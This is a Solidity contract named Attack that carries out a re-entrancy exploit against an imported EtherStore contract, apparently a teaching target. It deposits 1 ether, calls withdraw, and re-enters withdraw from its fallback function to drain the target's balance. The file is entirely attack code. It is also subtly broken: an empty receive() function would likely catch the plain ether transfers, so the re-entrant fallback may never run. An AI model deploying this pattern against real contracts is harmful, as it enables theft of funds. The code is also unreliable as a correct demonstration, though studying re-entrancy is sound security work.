// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

      // intialise the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }


    function attack() external payable {
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        etherStore.depositFunds{value: 1 ether}();
        // start attack
        etherStore.withdraw(1 ether);
    }

    // Fallback for re-entrance attack
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

   receive() external payable {
        // custom function code
    }
    
}